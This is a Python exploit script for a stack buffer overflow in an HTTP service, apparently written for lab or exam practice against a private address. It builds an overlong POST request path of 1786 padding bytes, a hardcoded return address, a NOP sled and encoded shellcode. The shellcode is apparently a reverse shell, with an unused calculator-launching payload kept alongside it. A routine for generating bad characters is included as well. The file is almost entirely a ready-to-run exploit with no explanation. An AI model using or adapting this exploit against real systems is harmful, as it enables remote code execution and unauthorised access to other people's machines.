import socket
import struct

def conv(address):
    return(struct.pack("<I", address))

def generate_badchar():
    badchar_test = b''
    badchars = [0x00, 0x0A, 0x0D]

    for i in range(0x00, 0xFF+1):
        if i not in badchars:
            badchar_test += struct.pack("B", i)

    with open("badchar_test.bin", "wb") as f:
        f.write(badchar_test)

    return(badchar_test)

def get_pattern():
    with open("pattern.txt", "rb") as f:
        return(f.read())

if __name__ == "__main__":
    IP = "192.168.56.134"
    PORT = 80
    SIZE = 1024
    OFFSET = 1786

    calculator =  b""
    calculator += b"\xba\xd2\x1e\x26\x48\xd9\xca\xd9\x74\x24\xf4"
    calculator += b"\x5d\x2b\xc9\xb1\x31\x83\xc5\x04\x31\x55\x0f"
    calculator += b"\x03\x55\xdd\xfc\xd3\xb4\x09\x82\x1c\x45\xc9"
    calculator += b"\xe3\x95\xa0\xf8\x23\xc1\xa1\xaa\x93\x81\xe4"
    calculator += b"\x46\x5f\xc7\x1c\xdd\x2d\xc0\x13\x56\x9b\x36"
    calculator += b"\x1d\x67\xb0\x0b\x3c\xeb\xcb\x5f\x9e\xd2\x03"
    calculator += b"\x92\xdf\x13\x79\x5f\x8d\xcc\xf5\xf2\x22\x79"
    calculator += b"\x43\xcf\xc9\x31\x45\x57\x2d\x81\x64\x76\xe0"
    calculator += b"\x9a\x3e\x58\x02\x4f\x4b\xd1\x1c\x8c\x76\xab"
    calculator += b"\x97\x66\x0c\x2a\x7e\xb7\xed\x81\xbf\x78\x1c"
    calculator += b"\xdb\xf8\xbe\xff\xae\xf0\xbd\x82\xa8\xc6\xbc"
    calculator += b"\x58\x3c\xdd\x66\x2a\xe6\x39\x97\xff\x71\xc9"
    calculator += b"\x9b\xb4\xf6\x95\xbf\x4b\xda\xad\xbb\xc0\xdd"
    calculator += b"\x61\x4a\x92\xf9\xa5\x17\x40\x63\xff\xfd\x27"
    calculator += b"\x9c\x1f\x5e\x97\x38\x6b\x72\xcc\x30\x36\x18"
    calculator += b"\x13\xc6\x4c\x6e\x13\xd8\x4e\xde\x7c\xe9\xc5"
    calculator += b"\xb1\xfb\xf6\x0f\xf6\xf4\xbc\x12\x5e\x9d\x18"
    calculator += b"\xc7\xe3\xc0\x9a\x3d\x27\xfd\x18\xb4\xd7\xfa"
    calculator += b"\x01\xbd\xd2\x47\x86\x2d\xae\xd8\x63\x52\x1d"
    calculator += b"\xd8\xa1\x31\xc0\x4a\x29\x98\x67\xeb\xc8\xe4"

    reverse =  b""
    reverse += b"\xba\xe3\xf7\x4c\x11\xdb\xcc\xd9\x74\x24\xf4\x5b"
    reverse += b"\x31\xc9\xb1\x3a\x31\x53\x13\x03\x53\x13\x83\xc3"
    reverse += b"\xe7\x15\xb9\xed\x0f\x5b\x42\x0e\xcf\x3c\xca\xeb"
    reverse += b"\xfe\x7c\xa8\x78\x50\x4d\xba\x2d\x5c\x26\xee\xc5"
    reverse += b"\xd7\x4a\x27\xe9\x50\xe0\x11\xc4\x61\x59\x61\x47"
    reverse += b"\xe1\xa0\xb6\xa7\xd8\x6a\xcb\xa6\x1d\x96\x26\xfa"
    reverse += b"\xf6\xdc\x95\xeb\x73\xa8\x25\x87\xcf\x3c\x2e\x74"
    reverse += b"\x87\x3f\x1f\x2b\x9c\x19\xbf\xcd\x71\x12\xf6\xd5"
    reverse += b"\x96\x1f\x40\x6d\x6c\xeb\x53\xa7\xbd\x14\xff\x86"
    reverse += b"\x72\xe7\x01\xce\xb4\x18\x74\x26\xc7\xa5\x8f\xfd"
    reverse += b"\xba\x71\x05\xe6\x1c\xf1\xbd\xc2\x9d\xd6\x58\x80"
    reverse += b"\x91\x93\x2f\xce\xb5\x22\xe3\x64\xc1\xaf\x02\xab"
    reverse += b"\x40\xeb\x20\x6f\x09\xaf\x49\x36\xf7\x1e\x75\x28"
    reverse += b"\x58\xfe\xd3\x22\x74\xeb\x69\x69\x12\xea\xfc\x17"
    reverse += b"\x50\xec\xfe\x17\xc4\x85\xcf\x9c\x8b\xd2\xcf\x76"
    reverse += b"\xe8\x2d\x9a\xdb\x58\xa6\x43\x8e\xd9\xab\x73\x64"
    reverse += b"\x1d\xd2\xf7\x8d\xdd\x21\xe7\xe7\xd8\x6e\xaf\x14"
    reverse += b"\x90\xff\x5a\x1b\x07\xff\x4e\x69\xd2\x91\x14\xe2"
    reverse += b"\x70\x5d\xe7\xd4\xed\xd9\x62\x09\xb1\x45\x5c\x70"
    reverse += b"\x7b\x58\xaf\xb4\x43\x8a\xfa\x8e\x9d\xe3\x34\xd9"
    reverse += b"\xbd\x77\x58\x55\x61\x0c\xc7\xe6\xed\xc2\x63\x65"
    reverse += b"\x61\x37\x5c\x75"

    inputBuffer  = b"A" * OFFSET
    inputBuffer += conv(0x76a7078f)
    inputBuffer += b"\x90" * 32
    inputBuffer += reverse

    buffer  = b"POST " + inputBuffer + b" HTTP/1.1\r\n"
    buffer += b"Host: " + IP.encode() + b"\r\n"
    buffer += b"\r\n"

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((IP, PORT))
        print(f"Sending:\n{buffer}")
        sock.send(buffer)
        sock.close()
        
    except Exception as err:
        print(f"Error -> {err}")